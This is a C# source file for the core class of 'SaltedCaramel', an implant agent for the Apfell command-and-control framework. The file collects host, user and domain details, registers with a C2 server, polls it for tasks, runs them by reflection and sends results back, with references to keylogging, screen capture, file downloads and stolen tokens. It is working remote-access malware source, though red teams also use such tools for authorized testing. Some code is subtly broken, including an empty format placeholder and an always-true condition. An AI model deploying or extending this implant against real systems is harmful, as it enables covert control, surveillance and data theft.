using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Linq;
using Apfell.Structs;
using Apfell.C2Profiles;
using SaltedCaramel.Tasks;
using SaltedCaramel.Jobs;

namespace SaltedCaramel
{

    /// <summary>
    /// This is the main working class that is responsible for
    /// connecting back to an Apfell server. This class will
    /// be responsbile for dispatching tasks and maintaining
    /// job states.
    /// </summary>
    public class SCImplant
    {
        private const int MAX_RETRIES = 20;
        public string action = "checkin";
        
        internal List<Job> JobList;
        public string host;
        public string ip;
        public int pid;
        internal int SleepInterval;
        public string user;
        public string uuid = "c1aa85e3-a62b-439e-912a-00560a4a1e21";
        public string domain;
        public string os;
        public string architecture;

        public C2Profile Profile;


        /// <summary>
        /// This is the main working class that is responsible for
        /// connecting back to an Apfell server. This class will
        /// be responsbile for dispatching tasks and maintaining
        /// job states.
        /// </summary>
        /// <param name="profileInstance">An instance of a C2Profile to establish communications with.</param>
        /// <param name="sleepTime">Sleep time to wait between checkins. Default 5 seconds.</param>
        public SCImplant(C2Profile profileInstance, int sleepTime=5000)
        {
            Profile = profileInstance;
            ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
            host = Dns.GetHostName();
            domain = Environment.UserDomainName;
            pid = Process.GetCurrentProcess().Id;
            os = Environment.OSVersion.VersionString;
            if (IntPtr.Size == 8)
                architecture = "x64";
            else
                architecture = "x86";
            SleepInterval = sleepTime;
            user = Environment.UserName;
            //Endpoint = serverEndpoint;
            JobList = new List<Job>();
        }

        /// <summary>
        /// Function responsible for kicking off the
        /// registration sequence for the agent to connect
        /// back to the primary Apfell Server specified by
        /// the given C2 Profile.
        /// </summary>
        /// <returns>TRUE if the agent was sucessfully registered with the server, FALSE otherwise.</returns>
        public bool InitializeImplant()
        {
            int retryCount = 0;
            // If we didn't get success, retry and increment counter
            while (retryCount < MAX_RETRIES)
            {
                try
                {
                    string newUUID = Profile.RegisterAgent(this);
                    uuid = newUUID;
                    retryCount = 0;
                    return true;
                } catch (Exception ex)
                {
                    retryCount++;
                    Thread.Sleep(SleepInterval);
                }
            }
            return false;
        }


        /// <summary>
        /// Main initializaiton task loop that will begin
        /// the task loop of the function should the agent
        /// successfully register to the Apfell server specified
        /// by the C2 Profile. On each checkin, should a job be
        /// issued, it will be added to its own job queue and begin
        /// start the task in a separate thread.
        /// </summary>
        public void Start()
        {
            if (InitializeImplant())
            {
                while (true)
                {
                    SCTask task = CheckTasking();
                    if (task.command != "none" && SCTask.TaskMap.ContainsKey(task.command))
                    {
                        Job j = new Job(task, this);
                        j.Start();

                        if (task.command != "jobs" || task.command != "jobkill") // We don't want to add our job tracking jobs.
                        {
                            JobList.Add(j);
                        }
                    }
                    Thread.Sleep(SleepInterval);
                }
            }
        }

        /// <summary>
        /// This function will be responsible for actually
        /// starting the associated task designated by a job.
        /// The task command must exist within the SCTask.TaskMap
        /// dictionary, otherwise it will fail to fire. Ideally,
        /// SCTask.TaskMap is pre-populated by Apfell and added
        /// as agent functionality is delivered.
        /// </summary>
        /// <param name="job">Job instance to kick off the task.</param>
        public void DispatchJob(Job job)
        {
            // using System.Reflection;
            // Type thisType = this.GetType();
            // MethodInfo theMethod = thisType.GetMethod(TheCommandString);
            // theMethod.Invoke(this, userParameters);
            string cmd;
            if (SCTask.TaskMap.TryGetValue(job.Task.command, out cmd))
            {
                object[] args = { job, this };
                var type = Type.GetType(String.Format("SaltedCaramel.Tasks.{}", cmd));
                type.GetMethod("Execute").Invoke(this, args);
            }

            SendResult(job);
        }

        /// <summary>
        /// Try and send a response to the Apfell server based
        /// on the MAX_RETRY count. 
        /// </summary>
        /// <param name="job">Job to send response data about.</param>
        /// <returns>TRUE if successful, FALSE otherwise.</returns>
        public bool TryPostResponse(Job job)
        {
            int retryCount = 0;
            string result;
            result = Profile.PostResponse(new SCTaskResp(job.Task.id, job.Task.message));
            while (!result.Contains("success") && retryCount < MAX_RETRIES)
            {
                result = Profile.PostResponse(new SCTaskResp(job.Task.id, job.Task.message));
                retryCount++;
            }
            return result.Contains("success");
        }

        /// <summary>
        /// Attempt to post a response to the Apfell server
        /// given a SCTaskResponse item. This function is
        /// primarily used when attempting to stream output
        /// to the Apfell server, such as is the case in
        /// keylogging or large file downloads.
        /// </summary>
        /// <param name="response">SCTaskResp instance</param>
        /// <returns>String version of the Apfell server response.</returns>
        public string TryGetPostResponse(SCTaskResp response)
        {
            int retryCount = 0;
            string result = "";
            result = Profile.PostResponse(response);
            while (!result.Contains("success") && retryCount < MAX_RETRIES)
            {
                result = Profile.PostResponse(response);
                retryCount++;
            }
            return result;
        }

        /// <summary>
        /// Attempt to post the response to the Apfell server. 
        /// Primarily this function is used by tasks who require
        /// streaming output to the server.
        /// </summary>
        /// <param name="response">SCTaskResp instance to send up to the mothership.</param>
        /// <returns>TRUE if successful, FALSE otherwise.</returns>
        public bool TryPostResponse(SCTaskResp response)
        {
            int retryCount = 0;
            string result;
            result = Profile.PostResponse(response);
            while (!result.Contains("success") && retryCount < MAX_RETRIES)
            {
                result = Profile.PostResponse(response);
                retryCount++;
            }
            return result.Contains("success");
        }

        /// <summary>
        /// Attempt to send a complete message based on the
        /// job associated with it.
        /// </summary>
        /// <param name="job">Job of the executing task.</param>
        /// <returns>TRUE if successful, FALSE otherwise.</returns>
        public bool TrySendComplete(Job job)
        {
            int retryCount = 0;
            string result = Profile.SendComplete(job.Task.id);
            while (!result.Contains("success") && retryCount < MAX_RETRIES)
            {
                result = Profile.SendComplete(job.Task.id);
                retryCount++;
            }
            return result.Contains("success");
        }

        /// <summary>
        /// Attempt to send a complete message based on the
        /// task id associated with it.
        /// </summary>
        /// <param name="taskID">SCTask.TaskID of the task.</param>
        /// <returns>TRUE if successful, FALSE otherwise.</returns>
        public bool TrySendComplete(string taskID)
        {
            int retryCount = 0;
            string result = Profile.SendComplete(taskID);
            while (!result.Contains("success") && retryCount < MAX_RETRIES)
            {
                result = Profile.SendComplete(taskID);
                retryCount++;
            }
            return result.Contains("success");
        }

        /// <summary>
        /// Send an error to the Apfell controller
        /// given a Job that has failed its one and
        /// only purpose.
        /// </summary>
        /// <param name="job">A Job class who has disappointed its parents.</param>
        /// <returns>TRUE if contact with Apfell was successful, FALSE otherwise.</returns>
        public bool TrySendError(Job job)
        {
            int retryCount = 0;
            string result;
            result = Profile.SendError(job.Task.id, job.Task.message);
            while (!result.Contains("success") && retryCount < MAX_RETRIES)
            {
                result = Profile.SendComplete(job.Task.id);
                retryCount++;
            }
            return result.Contains("success");
        }
        
        /// <summary>
        /// Send the message of the job over to the
        /// Apfell server and see how it goes. Maybe
        /// it works out, but maybe it doesn't. Who
        /// knows? That's life. That's why the return
        /// value is void.
        /// </summary>
        /// <param name="job">Job whose task completion status will be relayed.</param>
        public void SendResult(Job job)
        {
            int retryCount = 0;
            string result;
            if (job.Task.status == "complete" &&
                job.Task.command != "download" &&
                job.Task.command != "screencapture")
            {
                if (TryPostResponse(job))
                {
                    TrySendComplete(job);
                }
            }
            else if (job.Task.status == "error")
            {
                if (TrySendError(job))
                {
                    TrySendComplete(job);
                }
            }

            try
            {
                for (int i = 0; i < JobList.Count; ++i)
                {
                    if (JobList[i].JobID == job.JobID)
                    {
                        JobList.RemoveAt(i);
                    }
                }

            }
            catch (Exception e)
            {
                // This should only happen when testing.
                Debug.WriteLine($"[!] Caught exception: {e.Message}");
            }
        }

        /// <summary>
        /// Check the Apfell server to see if there's any
        /// taskings associated with our agent.
        /// </summary>
        /// <returns>
        /// SCTask instance with the action to perform, 
        /// if successful. The function returns null if the 
        /// application times out.
        /// </returns>
        public SCTask CheckTasking()
        {
            int retryCount = 0;
            SCTask task = null;
            while (retryCount < MAX_RETRIES)
            {
                try
                {
                    task = Profile.CheckTasking(this);
                    break;

                } catch (Exception ex)
                {
                    retryCount++;
                    Thread.Sleep(SleepInterval);
                }
            }
            return task;
        }

        /// <summary>
        /// Check if the implant has an alternate token
        /// </summary>
        /// <returns>True if the implant has an alternate token, false if not</returns>
        public bool HasAlternateToken()
        {
            if (Tasks.Token.stolenHandle != IntPtr.Zero)
                return true;
            else return false;
        }

        /// <summary>
        /// Determine if the current thread context
        /// has a current kerberos ticket attahed to
        /// it.
        /// </summary>
        /// <returns>
        /// TRUE if the current process has 
        /// a user associated with it, FALSE otherwise
        /// </returns>
        public bool HasCredentials()
        {
            if (Tasks.Token.Cred.User != null)
                return true;
            else return false;
        }
    }
}
